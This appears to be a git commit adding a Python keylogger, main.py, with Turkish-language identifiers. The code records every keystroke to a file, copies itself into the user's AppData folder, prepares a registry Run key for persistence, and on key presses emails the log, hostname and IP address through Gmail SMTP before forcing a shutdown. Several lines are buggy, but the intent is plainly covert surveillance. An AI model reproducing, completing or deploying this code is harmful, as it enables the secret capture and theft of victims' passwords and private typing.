74ea7a902e8ca375e60390f0b554a208c479af11
Fazz <97360909+FazzPy@users.noreply.github.com>
2022-04-11 19:02:20 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,54 @@
+from pynput.keyboard import Key, Listener
+import logging
+import socket
+import smtplib
+import subprocess
+import os
+import shutil
+import sys
+
+#Made By Fazz
+
+hostname = socket.gethostname()
+IP = socket.gethostbyname(hostname)
+
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+
+def regeditEkle():
+    yeniDosya = os.environ("appdata") + "\\keylogger.exe"
+    yeniDosya2 = os.environ("appdata") + "\\keylog.txt"
+    if not os.path.exists(yeniDosya):
+        shutil.copyfile(sys.executable,yeniDosya, yeniDosya2)
+        regeditCommand = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v REG_SZ /d " +yeniDosya
+
+regeditEkle()
+
+def on_press(key):
+    logging.info(str(key))
+
+    if key == Key.enter or Key.space:
+        from email.message import EmailMessage
+        Sender_Email = "Mail Adresiniz"
+        Reciever_Email = "Alıcı Mail Adresiniz"
+        Password = "Mail Adres şifreniz"
+        newMessage = EmailMessage()                         
+        newMessage['Subject'] = hostname 
+        newMessage['From'] = Sender_Email  
+        newMessage['To'] = Reciever_Email                   
+        newMessage.set_content(IP) 
+        files = ['keylog.txt']
+        for file in files:
+                with open(file, 'rb') as f:
+                    file_data = f.read()
+                    file_name = f.name
+                newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    
+            smtp.login(Sender_Email, Password)              
+            smtp.send_message(newMessage)
+            subprocess.call("shutdown /s")
+        
+ 
+with Listener(on_press=on_press) as listener :
+    listener.join()
+
